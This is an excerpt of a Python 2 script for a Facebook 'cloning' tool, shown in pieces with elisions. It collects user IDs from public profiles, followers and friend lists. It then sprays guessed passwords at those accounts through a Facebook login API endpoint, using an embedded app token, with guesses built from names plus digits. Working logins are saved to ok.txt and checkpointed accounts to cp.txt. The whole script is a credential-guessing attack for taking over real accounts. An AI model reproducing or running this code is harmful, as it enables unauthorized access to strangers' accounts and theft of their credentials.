...
print("\033[1;90m [2] ID/Pass login")
print("")
login_select()
def login_select():
afza = raw_input(" \033[1;90mSelect option: ")
if afza =="1":
os.system("clear")
print(logo)
print("")
print("\t \033[1;90mToken Login\033[0;97m")
print("")
...
print(logo)
print("")
print("\t \033[1;90mFB ID/PASS Login\033[0;97m")
print("")
...
print(logo)
print("")
print("\t \033[1;90mTurn on mobile data OR wifi \033[0;97m")
print("")
time.sleep(1)
raw_input(" Press enter to try again \033[0;90m")
b_menu()
os.system("clear")
print(logo)
print("")
...
print(47*" -")
print("")
print("\033[1;90m[1] Crack from public id")
print("\033[1;90m[2] Crack from followers")
print("\033[1;90m[3] View token")
print("\033[1;90m[4] Return method menu")
print("\033[1;90m[5] Logout")
print("")
b_menu_select()
def b_menu_select():
select = raw_input("\n\033[1;90m Select option: ")
id=[]
oks=[]
cps=[]
if select =="1":
...
print(logo)
print("")
print("\t\033[1;90mPublic id cloning")
print("")
idt = raw_input(" Input id: ")
try:
r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
q = json.loads(r.text)
print("\033[1;90m cloning from : "+q["name"])
except (KeyError , IOError):
print("")
print("\n\t \033[1;98m Logged in id has checkpoint\033[0;97m")
print("")
raw_input("\nPress enter to back ")
b_menu()
...
print("")
b_menu_select()
print(" \033[1;90mTotal IDs : "+str(len(id)))
time.sleep(0.5)
print(" \033[1;92 The process is running in background")
print("")
print 47*("-")
print('')
...
def main(arg):
	...
	try:
	    ...
	    if 'www.facebook.com' in d['error_msg']:
	        print("\033[1;90m[SDJ-CP] "+uid+" | "+pass1)
	        cp=open("cp.txt","a")
	        cp.write(uid+" | "+pass1+"\n")
	        cp.close()
	        cps.append(uid)
	    	...
	    	if "access_token" in d:
	            print("\x1b[1;92m[SDJ-OK] \033[1;92m"+uid+" | "+pass1+"\x1b[1;92m")
	            ok=open("ok.txt","a")
	            ok.write(uid+" | "+pass1+"\n")
	            ok.close()
	            oks.append(uid)
	            ...
	            d=json.loads(q)
	            if 'www.facebook.com' in d['error_msg']:
	                print("\033[1;90m[SDJ-CP] "+uid+" | "+pass2)
	                cp=open("cp.txt","a")
	                cp.write(uid+" | "+pass2+"\n")
	                cp.close()
	                cps.append(uid)
	                ...
	                if 'access_token' in d:
	                    print("\x1b[1;92m[SDJ-OK] \033[1;92m"+uid+" | "+pass2+"\x1b[1;92m")
	                    ok=open("ok.txt","a")
	                    ok.write(uid+" | "+pass2+"\n")
	                    ok.close()
	                    oks.append(uid)
	                    ...
	                    d=json.loads(q)
	                    if 'www.facebook.com' in d['error_msg']:
	                        print("\033[1;90m[SDJ-CP] "+uid+" | "+pass3)
	                        cp=open("cp.txt","a")
	                        cp.write(uid+" | "+pass3+"\n")
	                        cp.close()
	                        cps.append(uid)
	                        ...
	                        if 'access_token' in d:
	                            print(" \x1b[1;92m[SDJ-OK] \033[1;92m"+uid+" | "+pass3+"\x1b[1;92m")
	                            ok=open("ok.txt","a")
	                            ok.write(uid+" | "+pass3+"\n")
	                            ok.close()
	                            oks.append(uid)
	                        else:
	                            pass4=name.lower()+"1122"
	                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
	                            d=json.loads(q)
	                            if 'www.facebook.com' in d['error_msg']:
	                                print("\033[1;90m[SDJ-CP] "+uid+" | "+pass4)
	                                cp=open("cp.txt","a")
	                                cp.write(uid+" | "+pass4+"\n")
	                                cp.close()
	                                cps.append(uid)
	                                ...
	                                if 'access_token' in d:
	                                    print("\x1b[1;92m[SDJ-OK] \033[1;92m"+uid+" | "+pass4+"\x1b[1;92m")
	                                    ok=open("ok.txt","a")
	                                    ok.write(uid+" | "+pass4+"\n")
	                                    ok.close()
	                                    oks.append(uid)
	                                    ...
	                                    d=json.loads(q)
	                                    if 'www.facebook.com' in d['error_msg']:
	                                        print("\033[1;90m[SDJ-CP] "+uid+" | "+pass5)
	                                        cp=open("cp.txt","a")
	                                        cp.write(uid+" | "+pass5+"\n")
	                                        cp.close()
	                                        cps.append(uid)
	                                        ...
	                                        if 'access_token' in d:
	                                            print("\x1b[1;92m[SDJ-OK] \033[1;92m"+uid+" | "+pass5+"\x1b[1;92m")
	                                            ok=open("ok.txt","a")
	                                            ok.write(uid+" | "+pass5+"\n")
	                                            ok.close()
	                                            oks.append(uid)
	                                            ...
	                                            d=json.loads(q)
	                                            if 'www.facebook.com' in d['error_msg']:
	                                                print("\033[1;90m[SDJ-CP] "+uid+" | "+pass6)
	                                                cp=open("cp.txt","a")
	                                                cp.write(uid+" | "+pass6+"\n")
	                                                cp.close()
	                                                cps.append(uid)
	                                                ...
	                                                if 'access_token' in d:
	                                                    print("\x1b[1;92m[SDJ-OK] \033[1;92m"+uid+" | "+pass6+"\x1b[1;92m")
	                                                    ok=open("ok.txt","a")
	                                                    ok.write(uid+" | "+pass6+"\n")
	                                                    ok.close()
	                                                    oks.append(uid)
	                                                    ...
	                                                    d=json.loads(q)
	                                                    if 'www.facebook.com' in d['error_msg']:
	                                                        print("\033[1;90m[SDJ-CP] "+uid+" | "+pass7)
	                                                        cp=open("cp.txt","a")
	                                                        cp.write(uid+" | "+pass7+"\n")
	                                                        cp.close()
	                                                        cps.append(uid)
	                                                        ...
	                                                        if 'access_token' in d:
	                                                            print("\x1b[1;92m[SDJ-OK] \033[1;92m"+uid+" | "+pass7+"\x1b[1;92m")
	                                                            ok=open("ok.txt","a")
	                                                            ok.write(uid+" | "+pass7+"\n")
	                                                            ok.close()
	                                                            oks.append(uid)
	                                                            ...
	                                                            d=json.loads(q)
	                                                            if 'www.facebook.com' in d['error_msg']:
	                                                                print("\033[1;90m[SDJ-CP] "+uid+" | "+pass8)
	                                                                cp=open("cp.txt","a")
	                                                                cp.write(uid+" | "+pass8+"\n")
	                                                                cp.close()
	                                                                cps.append(uid)
	                                                                ...
	                                                                if 'access_token' in d:
	                                                                    print("\x1b[1;92m[SDJ-OK] \033[1;92m"+uid+" | "+pass8+"\x1b[1;92m")
	                                                                    ok=open("ok.txt","a")
	                                                                    ok.write(uid+" | "+pass8+"\n")
	                                                                    ok.close()
	                                                                    oks.append(uid)
...
print(logo)
print("")
print("\t \033[1;98mLogged In Token \033[0;97m")
print("")
print(" Token : " )
...
print(logo)
print("")
print("\t \033[1;32mCrack DOB From Friendlist\033[0;97m")
print("")
...
q = json.loads(data)
if "loc" in q:
print("\033[1;89m[SDJ-OK] \033[1;89m"+uid+" | "+pass1+"\033[0;89m")
ok = open("ok.txt","a")
ok.write(uid+" | "+pass1+"\n")
ok.close()
...
q = json.loads(data)
if "loc" in q:
print("\033[1;89m[SDJ-OK] \033[1;89m"+uid+" | "+pass2+"\033[0;89m")
ok = open("ok.txt","a")
ok.write(uid+" | "+pass2+"\n")
ok.close()
...
q = json.loads(data)
if "loc" in q:
print("\033[1;89m[SDJ-OK] \033[1;89m"+uid+" | "+pass3+"\033[0;89m")
ok = open("ok.txt","a")
ok.write(uid+" | "+pass3+"\n")
ok.close()
...
q = json.loads(data)
if "loc" in q:
print("\033[1;89m[SDJ-OK] \033[1;89m"+uid+" | "+pass4+"\033[0;89m")
ok = open("ok.txt","a")
ok.write(uid+" | "+pass4+"\n")
ok.close()
...
q = json.loads(data)
if "loc" in q:
print("\033[1;89m[SDJ-OK] \033[1;89m"+uid+" | "+pass5+"\033[0;91m")
ok = open("ok.txt","a")
ok.write(uid+" | "+pass5+"\n")
ok.close()
...
q = json.loads(data)
if "loc" in q:
print("\033[1;89m[SDJ-OK] \033[1;89m"+uid+" | "+pass6+"\033[0;89m")
ok = open("ok.txt","a")
ok.write(uid+" | "+pass6+"\n")
ok.close()
...
q = json.loads(data)
if "loc" in q:
print("\033[1;89m[SDJ-OK] \033[1;89m"+uid+" | "+pass7+"\033[0;89m")
ok = open("ok.txt","a")
ok.write(uid+" | "+pass7+"\n")
ok.close()
